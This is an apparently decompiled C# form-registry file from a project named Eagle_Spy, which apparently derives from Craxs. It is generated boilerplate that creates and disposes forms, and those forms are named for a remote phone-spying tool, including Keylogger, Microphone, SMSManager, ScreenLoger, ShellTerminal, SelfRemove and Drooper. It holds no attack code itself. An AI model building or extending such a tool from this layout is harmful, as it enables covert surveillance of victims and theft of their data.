using System;
using System.CodeDom.Compiler;
using System.Collections;
using System.ComponentModel;
using System.ComponentModel.Design;
using System.Diagnostics;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.ApplicationServices;
using Microsoft.VisualBasic.CompilerServices;

namespace Eagle_Spy.My;

[StandardModule]
[HideModuleName]
[GeneratedCode("MyTemplate", "11.0.0.0")]
internal sealed class MyProject
{
	[EditorBrowsable(EditorBrowsableState.Never)]
	[MyGroupCollection("System.Windows.Forms.Form", "Create__Instance__", "Dispose__Instance__", "My.MyProject.Forms")]
	internal sealed class MyForms
	{
		[ThreadStatic]
		private static Hashtable m_FormBeingCreated;

		[EditorBrowsable(EditorBrowsableState.Never)]
		public AccountManager m_AccountManager;

		[EditorBrowsable(EditorBrowsableState.Never)]
		public AddNumber m_AddNumber;

		[EditorBrowsable(EditorBrowsableState.Never)]
		//public Apk_studio m_Apk_studio;

	//	[EditorBrowsable(EditorBrowsableState.Never)]
		public Apkinstaller m_Apkinstaller;

		[EditorBrowsable(EditorBrowsableState.Never)]
		public Applications m_Applications;

		[EditorBrowsable(EditorBrowsableState.Never)]
		public AppsProperties m_AppsProperties;

		[EditorBrowsable(EditorBrowsableState.Never)]
		//public Auto_Clicker m_Auto_Clicker;

		//[EditorBrowsable(EditorBrowsableState.Never)]
		//public Build m_Build;

		///[EditorBrowsable(EditorBrowsableState.Never)]
		public CallPhone m_CallPhone;

		[EditorBrowsable(EditorBrowsableState.Never)]
		public Calls_Records m_Calls_Records;

		[EditorBrowsable(EditorBrowsableState.Never)]
		public CallsManager m_CallsManager;

		[EditorBrowsable(EditorBrowsableState.Never)]
		public CameraManager m_CameraManager;

		[EditorBrowsable(EditorBrowsableState.Never)]
		public ClipboardManager m_ClipboardManager;

		[EditorBrowsable(EditorBrowsableState.Never)]
		public Color_Box0 m_Color_Box0;

		[EditorBrowsable(EditorBrowsableState.Never)]
		public comptableform m_comptableform;

		[EditorBrowsable(EditorBrowsableState.Never)]
		public ContactsManager m_ContactsManager;

		[EditorBrowsable(EditorBrowsableState.Never)]
		//public EagleSpyAbout m_CraxsAbout;

		//[EditorBrowsable(EditorBrowsableState.Never)]
		public CraxsCallLogs m_craxscallslog;

		[EditorBrowsable(EditorBrowsableState.Never)]
		public Craxspopup m_Eaglepopup;

		[EditorBrowsable(EditorBrowsableState.Never)]
		public CraxsMain m_EagleSpyMain;

		//[EditorBrowsable(EditorBrowsableState.Never)]
		//public EagleSpySettinngs m_CraxsSettings;

		[EditorBrowsable(EditorBrowsableState.Never)]
	//	public EagleSpyStore m_CraxsStore;

	//	[EditorBrowsable(EditorBrowsableState.Never)]
		public Dialog1 m_Dialog1;

		[EditorBrowsable(EditorBrowsableState.Never)]
		public Dialog2 m_Dialog2;

		[EditorBrowsable(EditorBrowsableState.Never)]
		public DialogPloice m_DialogPloice;

		[EditorBrowsable(EditorBrowsableState.Never)]
		public Download m_Download;

		[EditorBrowsable(EditorBrowsableState.Never)]
		public Drooper m_Drooper;

		[EditorBrowsable(EditorBrowsableState.Never)]
		public Editor m_Editor;

		[EditorBrowsable(EditorBrowsableState.Never)]
		public EditSocket m_EditSocket;

	//	[EditorBrowsable(EditorBrowsableState.Never)]
	//	public Faker m_Faker;

		[EditorBrowsable(EditorBrowsableState.Never)]
		public FileManager m_FileManager;

		[EditorBrowsable(EditorBrowsableState.Never)]
		public Icons m_Icons;

		[EditorBrowsable(EditorBrowsableState.Never)]
		public information m_information;

		[EditorBrowsable(EditorBrowsableState.Never)]
		public inp m_inp;

	///	[EditorBrowsable(EditorBrowsableState.Never)]
		//public Jector m_Jector;

	///	[EditorBrowsable(EditorBrowsableState.Never)]
		//public KeyboardManager m_KeyboardManager;

		[EditorBrowsable(EditorBrowsableState.Never)]
		public Keylogger m_Keylogger;

		[EditorBrowsable(EditorBrowsableState.Never)]
		public LanguageSelector m_LanguageSelector;

		[EditorBrowsable(EditorBrowsableState.Never)]
		public LocationManager m_LocationManager;

		[EditorBrowsable(EditorBrowsableState.Never)]
		public Microphone m_Microphone;

		[EditorBrowsable(EditorBrowsableState.Never)]
		public nonetform m_nonetform;

		[EditorBrowsable(EditorBrowsableState.Never)]
		public PermissionsManager m_PermissionsManager;

		[EditorBrowsable(EditorBrowsableState.Never)]
		public Ports m_Ports;

		[EditorBrowsable(EditorBrowsableState.Never)]
		public Report m_Report;

		[EditorBrowsable(EditorBrowsableState.Never)]
		public ScreenLoger m_ScreenLoger;

		[EditorBrowsable(EditorBrowsableState.Never)]
		public ScreenReader m_ScreenReader;

		[EditorBrowsable(EditorBrowsableState.Never)]
		public ScreenReaderV2 m_ScreenReaderV2;

		[EditorBrowsable(EditorBrowsableState.Never)]
		public ScreenShoter m_ScreenShoter;

		[EditorBrowsable(EditorBrowsableState.Never)]
		public SelfRemove m_SelfRemove;

		[EditorBrowsable(EditorBrowsableState.Never)]
		public Settings m_Settings;

		[EditorBrowsable(EditorBrowsableState.Never)]
		public ShellTerminal m_ShellTerminal;

		[EditorBrowsable(EditorBrowsableState.Never)]
		public smsMaker m_smsMaker;

		[EditorBrowsable(EditorBrowsableState.Never)]
		public SMSManager m_SMSManager;

		[EditorBrowsable(EditorBrowsableState.Never)]
		public snapsdownloader m_snapsdownloader;

		[EditorBrowsable(EditorBrowsableState.Never)]
		//public tipfirewalltracker m_tipfirewalltracker;

	//	[EditorBrowsable(EditorBrowsableState.Never)]
	//	public Updater m_Updater;

	///	[EditorBrowsable(EditorBrowsableState.Never)]
		//public UpdatesScreen m_UpdatesScreen;

	//	[EditorBrowsable(EditorBrowsableState.Never)]
		public Upload m_Upload;

		[EditorBrowsable(EditorBrowsableState.Never)]
		public WebViewMonitor m_WebViewMonitor;

		[EditorBrowsable(EditorBrowsableState.Never)]
		public Win_Users m_Win_Users;

		public AccountManager AccountManager
		{
			[DebuggerHidden]
			get
			{
				m_AccountManager = Create__Instance__(m_AccountManager);
				return m_AccountManager;
			}
			[DebuggerHidden]
			set
			{
				if (value != m_AccountManager)
				{
					if (value != null)
						throw new ArgumentException("Property can only be set to Nothing");
					Dispose__Instance__(ref m_AccountManager);
				}
			}
		}

		public AddNumber AddNumber
		{
			[DebuggerHidden]
			get
			{
				m_AddNumber = Create__Instance__(m_AddNumber);
				return m_AddNumber;
			}
			[DebuggerHidden]
			set
			{
				if (value != m_AddNumber)
				{
					if (value != null)
						throw new ArgumentException("Property can only be set to Nothing");
					Dispose__Instance__(ref m_AddNumber);
				}
			}
		}

		

		public Apkinstaller Apkinstaller
		{
			[DebuggerHidden]
			get
			{
				m_Apkinstaller = Create__Instance__(m_Apkinstaller);
				return m_Apkinstaller;
			}
			[DebuggerHidden]
			set
			{
				if (value != m_Apkinstaller)
				{
					if (value != null)
						throw new ArgumentException("Property can only be set to Nothing");
					Dispose__Instance__(ref m_Apkinstaller);
				}
			}
		}

		public Applications Applications
		{
			[DebuggerHidden]
			get
			{
				m_Applications = Create__Instance__(m_Applications);
				return m_Applications;
			}
			[DebuggerHidden]
			set
			{
				if (value != m_Applications)
				{
					if (value != null)
						throw new ArgumentException("Property can only be set to Nothing");
					Dispose__Instance__(ref m_Applications);
				}
			}
		}

		public AppsProperties AppsProperties
		{
			[DebuggerHidden]
			get
			{
				m_AppsProperties = Create__Instance__(m_AppsProperties);
				return m_AppsProperties;
			}
			[DebuggerHidden]
			set
			{
				if (value != m_AppsProperties)
				{
					if (value != null)
						throw new ArgumentException("Property can only be set to Nothing");
					Dispose__Instance__(ref m_AppsProperties);
				}
			}
		}

		
		

		public CallPhone CallPhone
		{
			[DebuggerHidden]
			get
			{
				m_CallPhone = Create__Instance__(m_CallPhone);
				return m_CallPhone;
			}
			[DebuggerHidden]
			set
			{
				if (value != m_CallPhone)
				{
					if (value != null)
						throw new ArgumentException("Property can only be set to Nothing");
					Dispose__Instance__(ref m_CallPhone);
				}
			}
		}

		public Calls_Records Calls_Records
		{
			[DebuggerHidden]
			get
			{
				m_Calls_Records = Create__Instance__(m_Calls_Records);
				return m_Calls_Records;
			}
			[DebuggerHidden]
			set
			{
				if (value != m_Calls_Records)
				{
					if (value != null)
						throw new ArgumentException("Property can only be set to Nothing");
					Dispose__Instance__(ref m_Calls_Records);
				}
			}
		}

		public CallsManager CallsManager
		{
			[DebuggerHidden]
			get
			{
				m_CallsManager = Create__Instance__(m_CallsManager);
				return m_CallsManager;
			}
			[DebuggerHidden]
			set
			{
				if (value != m_CallsManager)
				{
					if (value != null)
						throw new ArgumentException("Property can only be set to Nothing");
					Dispose__Instance__(ref m_CallsManager);
				}
			}
		}

		public CameraManager CameraManager
		{
			[DebuggerHidden]
			get
			{
				m_CameraManager = Create__Instance__(m_CameraManager);
				return m_CameraManager;
			}
			[DebuggerHidden]
			set
			{
				if (value != m_CameraManager)
				{
					if (value != null)
						throw new ArgumentException("Property can only be set to Nothing");
					Dispose__Instance__(ref m_CameraManager);
				}
			}
		}

		public ClipboardManager ClipboardManager
		{
			[DebuggerHidden]
			get
			{
				m_ClipboardManager = Create__Instance__(m_ClipboardManager);
				return m_ClipboardManager;
			}
			[DebuggerHidden]
			set
			{
				if (value != m_ClipboardManager)
				{
					if (value != null)
						throw new ArgumentException("Property can only be set to Nothing");
					Dispose__Instance__(ref m_ClipboardManager);
				}
			}
		}

		public Color_Box0 Color_Box0
		{
			[DebuggerHidden]
			get
			{
				m_Color_Box0 = Create__Instance__(m_Color_Box0);
				return m_Color_Box0;
			}
			[DebuggerHidden]
			set
			{
				if (value != m_Color_Box0)
				{
					if (value != null)
						throw new ArgumentException("Property can only be set to Nothing");
					Dispose__Instance__(ref m_Color_Box0);
				}
			}
		}

		public comptableform comptableform
		{
			[DebuggerHidden]
			get
			{
				m_comptableform = Create__Instance__(m_comptableform);
				return m_comptableform;
			}
			[DebuggerHidden]
			set
			{
				if (value != m_comptableform)
				{
					if (value != null)
						throw new ArgumentException("Property can only be set to Nothing");
					Dispose__Instance__(ref m_comptableform);
				}
			}
		}

		public ContactsManager ContactsManager
		{
			[DebuggerHidden]
			get
			{
				m_ContactsManager = Create__Instance__(m_ContactsManager);
				return m_ContactsManager;
			}
			[DebuggerHidden]
			set
			{
				if (value != m_ContactsManager)
				{
					if (value != null)
						throw new ArgumentException("Property can only be set to Nothing");
					Dispose__Instance__(ref m_ContactsManager);
				}
			}
		}

	

		public CraxsCallLogs craxscallslog
		{
			[DebuggerHidden]
			get
			{
				m_craxscallslog = Create__Instance__(m_craxscallslog);
				return m_craxscallslog;
			}
			[DebuggerHidden]
			set
			{
				if (value != m_craxscallslog)
				{
					if (value != null)
						throw new ArgumentException("Property can only be set to Nothing");
					Dispose__Instance__(ref m_craxscallslog);
				}
			}
		}

		public Craxspopup Eaglepopup
		{
			[DebuggerHidden]
			get
			{
				m_Eaglepopup = Create__Instance__(m_Eaglepopup);
				return m_Eaglepopup;
			}
			[DebuggerHidden]
			set
			{
				if (value != m_Eaglepopup)
				{
					if (value != null)
						throw new ArgumentException("Property can only be set to Nothing");
					Dispose__Instance__(ref m_Eaglepopup);
				}
			}
		}

		public CraxsMain EagleSpyMain
		{
			[DebuggerHidden]
			get
			{
				m_EagleSpyMain = Create__Instance__(m_EagleSpyMain);
				return m_EagleSpyMain;
			}
			[DebuggerHidden]
			set
			{
				if (value != m_EagleSpyMain)
				{
					if (value != null)
						throw new ArgumentException("Property can only be set to Nothing");
					Dispose__Instance__(ref m_EagleSpyMain);
				}
			}
		}

		
		
		

		public Dialog1 Dialog1
		{
			[DebuggerHidden]
			get
			{
				m_Dialog1 = Create__Instance__(m_Dialog1);
				return m_Dialog1;
			}
			[DebuggerHidden]
			set
			{
				if (value != m_Dialog1)
				{
					if (value != null)
						throw new ArgumentException("Property can only be set to Nothing");
					Dispose__Instance__(ref m_Dialog1);
				}
			}
		}

		public Dialog2 Dialog2
		{
			[DebuggerHidden]
			get
			{
				m_Dialog2 = Create__Instance__(m_Dialog2);
				return m_Dialog2;
			}
			[DebuggerHidden]
			set
			{
				if (value != m_Dialog2)
				{
					if (value != null)
						throw new ArgumentException("Property can only be set to Nothing");
					Dispose__Instance__(ref m_Dialog2);
				}
			}
		}

		public DialogPloice DialogPloice
		{
			[DebuggerHidden]
			get
			{
				m_DialogPloice = Create__Instance__(m_DialogPloice);
				return m_DialogPloice;
			}
			[DebuggerHidden]
			set
			{
				if (value != m_DialogPloice)
				{
					if (value != null)
						throw new ArgumentException("Property can only be set to Nothing");
					Dispose__Instance__(ref m_DialogPloice);
				}
			}
		}

		public Download Download
		{
			[DebuggerHidden]
			get
			{
				m_Download = Create__Instance__(m_Download);
				return m_Download;
			}
			[DebuggerHidden]
			set
			{
				if (value != m_Download)
				{
					if (value != null)
						throw new ArgumentException("Property can only be set to Nothing");
					Dispose__Instance__(ref m_Download);
				}
			}
		}

		public Drooper Drooper
		{
			[DebuggerHidden]
			get
			{
				m_Drooper = Create__Instance__(m_Drooper);
				return m_Drooper;
			}
			[DebuggerHidden]
			set
			{
				if (value != m_Drooper)
				{
					if (value != null)
						throw new ArgumentException("Property can only be set to Nothing");
					Dispose__Instance__(ref m_Drooper);
				}
			}
		}

		public Editor Editor
		{
			[DebuggerHidden]
			get
			{
				m_Editor = Create__Instance__(m_Editor);
				return m_Editor;
			}
			[DebuggerHidden]
			set
			{
				if (value != m_Editor)
				{
					if (value != null)
						throw new ArgumentException("Property can only be set to Nothing");
					Dispose__Instance__(ref m_Editor);
				}
			}
		}

		public EditSocket EditSocket
		{
			[DebuggerHidden]
			get
			{
				m_EditSocket = Create__Instance__(m_EditSocket);
				return m_EditSocket;
			}
			[DebuggerHidden]
			set
			{
				if (value != m_EditSocket)
				{
					if (value != null)
						throw new ArgumentException("Property can only be set to Nothing");
					Dispose__Instance__(ref m_EditSocket);
				}
			}
		}

		

		public FileManager FileManager
		{
			[DebuggerHidden]
			get
			{
				m_FileManager = Create__Instance__(m_FileManager);
				return m_FileManager;
			}
			[DebuggerHidden]
			set
			{
				if (value != m_FileManager)
				{
					if (value != null)
						throw new ArgumentException("Property can only be set to Nothing");
					Dispose__Instance__(ref m_FileManager);
				}
			}
		}

		public Icons Icons
		{
			[DebuggerHidden]
			get
			{
				m_Icons = Create__Instance__(m_Icons);
				return m_Icons;
			}
			[DebuggerHidden]
			set
			{
				if (value != m_Icons)
				{
					if (value != null)
						throw new ArgumentException("Property can only be set to Nothing");
					Dispose__Instance__(ref m_Icons);
				}
			}
		}

		public information information
		{
			[DebuggerHidden]
			get
			{
				m_information = Create__Instance__(m_information);
				return m_information;
			}
			[DebuggerHidden]
			set
			{
				if (value != m_information)
				{
					if (value != null)
						throw new ArgumentException("Property can only be set to Nothing");
					Dispose__Instance__(ref m_information);
				}
			}
		}

		public inp inp
		{
			[DebuggerHidden]
			get
			{
				m_inp = Create__Instance__(m_inp);
				return m_inp;
			}
			[DebuggerHidden]
			set
			{
				if (value != m_inp)
				{
					if (value != null)
						throw new ArgumentException("Property can only be set to Nothing");
					Dispose__Instance__(ref m_inp);
				}
			}
		}

	

	
		public Keylogger Keylogger
		{
			[DebuggerHidden]
			get
			{
				m_Keylogger = Create__Instance__(m_Keylogger);
				return m_Keylogger;
			}
			[DebuggerHidden]
			set
			{
				if (value != m_Keylogger)
				{
					if (value != null)
						throw new ArgumentException("Property can only be set to Nothing");
					Dispose__Instance__(ref m_Keylogger);
				}
			}
		}

		public LanguageSelector LanguageSelector
		{
			[DebuggerHidden]
			get
			{
				m_LanguageSelector = Create__Instance__(m_LanguageSelector);
				return m_LanguageSelector;
			}
			[DebuggerHidden]
			set
			{
				if (value != m_LanguageSelector)
				{
					if (value != null)
						throw new ArgumentException("Property can only be set to Nothing");
					Dispose__Instance__(ref m_LanguageSelector);
				}
			}
		}

		public LocationManager LocationManager
		{
			[DebuggerHidden]
			get
			{
				m_LocationManager = Create__Instance__(m_LocationManager);
				return m_LocationManager;
			}
			[DebuggerHidden]
			set
			{
				if (value != m_LocationManager)
				{
					if (value != null)
						throw new ArgumentException("Property can only be set to Nothing");
					Dispose__Instance__(ref m_LocationManager);
				}
			}
		}

		public Microphone Microphone
		{
			[DebuggerHidden]
			get
			{
				m_Microphone = Create__Instance__(m_Microphone);
				return m_Microphone;
			}
			[DebuggerHidden]
			set
			{
				if (value != m_Microphone)
				{
					if (value != null)
						throw new ArgumentException("Property can only be set to Nothing");
					Dispose__Instance__(ref m_Microphone);
				}
			}
		}

		public nonetform nonetform
		{
			[DebuggerHidden]
			get
			{
				m_nonetform = Create__Instance__(m_nonetform);
				return m_nonetform;
			}
			[DebuggerHidden]
			set
			{
				if (value != m_nonetform)
				{
					if (value != null)
						throw new ArgumentException("Property can only be set to Nothing");
					Dispose__Instance__(ref m_nonetform);
				}
			}
		}

		public PermissionsManager PermissionsManager
		{
			[DebuggerHidden]
			get
			{
				m_PermissionsManager = Create__Instance__(m_PermissionsManager);
				return m_PermissionsManager;
			}
			[DebuggerHidden]
			set
			{
				if (value != m_PermissionsManager)
				{
					if (value != null)
						throw new ArgumentException("Property can only be set to Nothing");
					Dispose__Instance__(ref m_PermissionsManager);
				}
			}
		}

		public Ports Ports
		{
			[DebuggerHidden]
			get
			{
				m_Ports = Create__Instance__(m_Ports);
				return m_Ports;
			}
			[DebuggerHidden]
			set
			{
				if (value != m_Ports)
				{
					if (value != null)
						throw new ArgumentException("Property can only be set to Nothing");
					Dispose__Instance__(ref m_Ports);
				}
			}
		}

		public Report Report
		{
			[DebuggerHidden]
			get
			{
				m_Report = Create__Instance__(m_Report);
				return m_Report;
			}
			[DebuggerHidden]
			set
			{
				if (value != m_Report)
				{
					if (value != null)
						throw new ArgumentException("Property can only be set to Nothing");
					Dispose__Instance__(ref m_Report);
				}
			}
		}

		public ScreenLoger ScreenLoger
		{
			[DebuggerHidden]
			get
			{
				m_ScreenLoger = Create__Instance__(m_ScreenLoger);
				return m_ScreenLoger;
			}
			[DebuggerHidden]
			set
			{
				if (value != m_ScreenLoger)
				{
					if (value != null)
						throw new ArgumentException("Property can only be set to Nothing");
					Dispose__Instance__(ref m_ScreenLoger);
				}
			}
		}

		public ScreenReader ScreenReader
		{
			[DebuggerHidden]
			get
			{
				m_ScreenReader = Create__Instance__(m_ScreenReader);
				return m_ScreenReader;
			}
			[DebuggerHidden]
			set
			{
				if (value != m_ScreenReader)
				{
					if (value != null)
						throw new ArgumentException("Property can only be set to Nothing");
					Dispose__Instance__(ref m_ScreenReader);
				}
			}
		}

		public ScreenReaderV2 ScreenReaderV2
		{
			[DebuggerHidden]
			get
			{
				m_ScreenReaderV2 = Create__Instance__(m_ScreenReaderV2);
				return m_ScreenReaderV2;
			}
			[DebuggerHidden]
			set
			{
				if (value != m_ScreenReaderV2)
				{
					if (value != null)
						throw new ArgumentException("Property can only be set to Nothing");
					Dispose__Instance__(ref m_ScreenReaderV2);
				}
			}
		}

		public ScreenShoter ScreenShoter
		{
			[DebuggerHidden]
			get
			{
				m_ScreenShoter = Create__Instance__(m_ScreenShoter);
				return m_ScreenShoter;
			}
			[DebuggerHidden]
			set
			{
				if (value != m_ScreenShoter)
				{
					if (value != null)
						throw new ArgumentException("Property can only be set to Nothing");
					Dispose__Instance__(ref m_ScreenShoter);
				}
			}
		}

		public SelfRemove SelfRemove
		{
			[DebuggerHidden]
			get
			{
				m_SelfRemove = Create__Instance__(m_SelfRemove);
				return m_SelfRemove;
			}
			[DebuggerHidden]
			set
			{
				if (value != m_SelfRemove)
				{
					if (value != null)
						throw new ArgumentException("Property can only be set to Nothing");
					Dispose__Instance__(ref m_SelfRemove);
				}
			}
		}

		public Settings Settings
		{
			[DebuggerHidden]
			get
			{
				m_Settings = Create__Instance__(m_Settings);
				return m_Settings;
			}
			[DebuggerHidden]
			set
			{
				if (value != m_Settings)
				{
					if (value != null)
						throw new ArgumentException("Property can only be set to Nothing");
					Dispose__Instance__(ref m_Settings);
				}
			}
		}

		public ShellTerminal ShellTerminal
		{
			[DebuggerHidden]
			get
			{
				m_ShellTerminal = Create__Instance__(m_ShellTerminal);
				return m_ShellTerminal;
			}
			[DebuggerHidden]
			set
			{
				if (value != m_ShellTerminal)
				{
					if (value != null)
						throw new ArgumentException("Property can only be set to Nothing");
					Dispose__Instance__(ref m_ShellTerminal);
				}
			}
		}

		public smsMaker smsMaker
		{
			[DebuggerHidden]
			get
			{
				m_smsMaker = Create__Instance__(m_smsMaker);
				return m_smsMaker;
			}
			[DebuggerHidden]
			set
			{
				if (value != m_smsMaker)
				{
					if (value != null)
						throw new ArgumentException("Property can only be set to Nothing");
					Dispose__Instance__(ref m_smsMaker);
				}
			}
		}

		public SMSManager SMSManager
		{
			[DebuggerHidden]
			get
			{
				m_SMSManager = Create__Instance__(m_SMSManager);
				return m_SMSManager;
			}
			[DebuggerHidden]
			set
			{
				if (value != m_SMSManager)
				{
					if (value != null)
						throw new ArgumentException("Property can only be set to Nothing");
					Dispose__Instance__(ref m_SMSManager);
				}
			}
		}

		public snapsdownloader snapsdownloader
		{
			[DebuggerHidden]
			get
			{
				m_snapsdownloader = Create__Instance__(m_snapsdownloader);
				return m_snapsdownloader;
			}
			[DebuggerHidden]
			set
			{
				if (value != m_snapsdownloader)
				{
					if (value != null)
						throw new ArgumentException("Property can only be set to Nothing");
					Dispose__Instance__(ref m_snapsdownloader);
				}
			}
		}

		
		
		

		public Upload Upload
		{
			[DebuggerHidden]
			get
			{
				m_Upload = Create__Instance__(m_Upload);
				return m_Upload;
			}
			[DebuggerHidden]
			set
			{
				if (value != m_Upload)
				{
					if (value != null)
						throw new ArgumentException("Property can only be set to Nothing");
					Dispose__Instance__(ref m_Upload);
				}
			}
		}

		public WebViewMonitor WebViewMonitor
		{
			[DebuggerHidden]
			get
			{
				m_WebViewMonitor = Create__Instance__(m_WebViewMonitor);
				return m_WebViewMonitor;
			}
			[DebuggerHidden]
			set
			{
				if (value != m_WebViewMonitor)
				{
					if (value != null)
						throw new ArgumentException("Property can only be set to Nothing");
					Dispose__Instance__(ref m_WebViewMonitor);
				}
			}
		}

		public Win_Users Win_Users
		{
			[DebuggerHidden]
			get
			{
				m_Win_Users = Create__Instance__(m_Win_Users);
				return m_Win_Users;
			}
			[DebuggerHidden]
			set
			{
				if (value != m_Win_Users)
				{
					if (value != null)
						throw new ArgumentException("Property can only be set to Nothing");
					Dispose__Instance__(ref m_Win_Users);
				}
			}
		}

		[DebuggerHidden]
		private static T Create__Instance__<T>(T Instance) where T : Form, new()
		{
			if (Instance != null && !Instance.IsDisposed)
				return Instance;
			if (m_FormBeingCreated != null)
			{
				if (m_FormBeingCreated.ContainsKey(typeof(T)))
					throw new InvalidOperationException(Utils.GetResourceString("WinForms_RecursiveFormCreate"));
			}
			else
				m_FormBeingCreated = new Hashtable();
			m_FormBeingCreated.Add(typeof(T), null);
			try
			{
				return new T();
			}
			catch (TargetInvocationException ex) when (((Func<bool>)delegate
			{
				// Could not convert BlockContainer to single expression
				ProjectData.SetProjectError(ex);
				return ex.InnerException != null;
			}).Invoke())
			{
				string resourceString = Utils.GetResourceString("WinForms_SeeInnerException", ex.InnerException.Message);
				throw new InvalidOperationException(resourceString, ex.InnerException);
			}
			finally
			{
				m_FormBeingCreated.Remove(typeof(T));
			}
		}

		[DebuggerHidden]
		private void Dispose__Instance__<T>(ref T instance) where T : Form
		{
			instance.Dispose();
			instance = null;
		}

		[DebuggerHidden]
		[EditorBrowsable(EditorBrowsableState.Never)]
		public MyForms()
		{
		}

		[EditorBrowsable(EditorBrowsableState.Never)]
		public override bool Equals(object o)
		{
			return base.Equals(RuntimeHelpers.GetObjectValue(o));
		}

		[EditorBrowsable(EditorBrowsableState.Never)]
		public override int GetHashCode()
		{
			return base.GetHashCode();
		}

		[EditorBrowsable(EditorBrowsableState.Never)]
		internal new Type GetType()
		{
			return typeof(MyForms);
		}

		[EditorBrowsable(EditorBrowsableState.Never)]
		public override string ToString()
		{
			return base.ToString();
		}
	}

	[EditorBrowsable(EditorBrowsableState.Never)]
	[MyGroupCollection("System.Web.Services.Protocols.SoapHttpClientProtocol", "Create__Instance__", "Dispose__Instance__", "")]
	internal sealed class MyWebServices
	{
		[EditorBrowsable(EditorBrowsableState.Never)]
		[DebuggerHidden]
		public override bool Equals(object o)
		{
			return base.Equals(RuntimeHelpers.GetObjectValue(o));
		}

		[EditorBrowsable(EditorBrowsableState.Never)]
		[DebuggerHidden]
		public override int GetHashCode()
		{
			return base.GetHashCode();
		}

		[EditorBrowsable(EditorBrowsableState.Never)]
		[DebuggerHidden]
		internal new Type GetType()
		{
			return typeof(MyWebServices);
		}

		[EditorBrowsable(EditorBrowsableState.Never)]
		[DebuggerHidden]
		public override string ToString()
		{
			return base.ToString();
		}

		[DebuggerHidden]
		private static T Create__Instance__<T>(T instance) where T : new()
		{
			if (instance == null)
				return new T();
			return instance;
		}

		[DebuggerHidden]
		private void Dispose__Instance__<T>(ref T instance)
		{
			instance = default(T);
		}

		[DebuggerHidden]
		[EditorBrowsable(EditorBrowsableState.Never)]
		public MyWebServices()
		{
		}
	}

	[EditorBrowsable(EditorBrowsableState.Never)]
	[ComVisible(false)]
	internal sealed class ThreadSafeObjectProvider<T> where T : new()
	{
		[CompilerGenerated]
		[ThreadStatic]
		private static T m_ThreadStaticValue;

		internal T GetInstance
		{
			[DebuggerHidden]
			get
			{
				if (m_ThreadStaticValue == null)
					m_ThreadStaticValue = new T();
				return m_ThreadStaticValue;
			}
		}

		[DebuggerHidden]
		[EditorBrowsable(EditorBrowsableState.Never)]
		public ThreadSafeObjectProvider()
		{
		}
	}

	private static readonly ThreadSafeObjectProvider<MyComputer> m_ComputerObjectProvider = new ThreadSafeObjectProvider<MyComputer>();

	private static readonly ThreadSafeObjectProvider<MyApplication> m_AppObjectProvider = new ThreadSafeObjectProvider<MyApplication>();

	private static readonly ThreadSafeObjectProvider<User> m_UserObjectProvider = new ThreadSafeObjectProvider<User>();

	private static ThreadSafeObjectProvider<MyForms> m_MyFormsObjectProvider = new ThreadSafeObjectProvider<MyForms>();

	private static readonly ThreadSafeObjectProvider<MyWebServices> m_MyWebServicesObjectProvider = new ThreadSafeObjectProvider<MyWebServices>();

	[HelpKeyword("My.Computer")]
	internal static MyComputer Computer
	{
		[DebuggerHidden]
		get
		{
			return m_ComputerObjectProvider.GetInstance;
		}
	}

	[HelpKeyword("My.Application")]
	internal static MyApplication Application
	{
		[DebuggerHidden]
		get
		{
			return m_AppObjectProvider.GetInstance;
		}
	}

	[HelpKeyword("My.User")]
	internal static User User
	{
		[DebuggerHidden]
		get
		{
			return m_UserObjectProvider.GetInstance;
		}
	}

	[HelpKeyword("My.Forms")]
	internal static MyForms Forms
	{
		[DebuggerHidden]
		get
		{
			return m_MyFormsObjectProvider.GetInstance;
		}
	}

	[HelpKeyword("My.WebServices")]
	internal static MyWebServices WebServices
	{
		[DebuggerHidden]
		get
		{
			return m_MyWebServicesObjectProvider.GetInstance;
		}
	}
}
